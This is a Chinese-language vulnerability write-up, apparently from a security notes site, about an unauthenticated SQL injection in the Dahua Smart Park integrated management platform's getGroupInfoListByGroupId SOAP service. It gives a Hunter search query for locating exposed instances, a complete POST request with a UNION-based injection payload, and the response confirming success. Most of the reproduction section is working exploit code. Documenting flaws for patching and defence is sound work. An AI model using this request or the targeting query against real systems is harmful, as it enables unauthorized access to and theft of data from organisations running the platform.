# 大华智慧园区综合管理平台getGroupInfoListByGroupId SQL注入漏洞

# 一、漏洞简介
  “大华智慧园区综合管理平台”是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。平台意在协助优化园区资源分配，满足多元化的管理需求，同时通过提供智能服务，增强使用体验。大华智慧园区综合管理平台未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。远程未授权攻击者可利用此漏洞获取敏感信息，进一步利用可能获取目标系统权限。

# 二、影响版本
+ 大华智慧园区综合管理平台

# 三、资产测绘
+ hunter：`app.name="Dahua 大华 智慧园区管理平台"`

![1691829123219-724bd409-5d1c-4593-88e9-2990fef366ad.png](./img/HyCfpnh12vPSlAOZ/1691829123219-724bd409-5d1c-4593-88e9-2990fef366ad-892669.png)

+ 登录页面：

![1691828319702-85171e4b-cb4b-4826-a654-3c8859b17138.png](./img/HyCfpnh12vPSlAOZ/1691828319702-85171e4b-cb4b-4826-a654-3c8859b17138-055362.png)

# 四、漏洞复现
```plain
POST /portal/services/clientServer HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: {hostname}
Content-Length: 509

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://clientServer.webservice.dssc.dahua.com">
   <soapenv:Header/>
   <soapenv:Body>
      <cli:getGroupInfoListByGroupId>
         <!--type: string-->
         <arg0>5398) UNION ALL SELECT 5336,5336,5336,5336,CONCAT(0x7178787a71,IFNULL(CAST(111*111 AS NCHAR),0x20),0x7171717871)-- -</arg0>
         <!--type: long-->
         <arg1>10</arg1>
      </cli:getGroupInfoListByGroupId>
   </soapenv:Body>
</soapenv:Envelope>
```

![1702740228771-97951741-ca39-45d7-9bbe-523aec3c6b2d.png](./img/HyCfpnh12vPSlAOZ/1702740228771-97951741-ca39-45d7-9bbe-523aec3c6b2d-553522.png)

```plain
qxxzq12321qqqxq
```



> 更新: 2024-02-29 23:57:18  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mwwzf1bqn91wm5nk>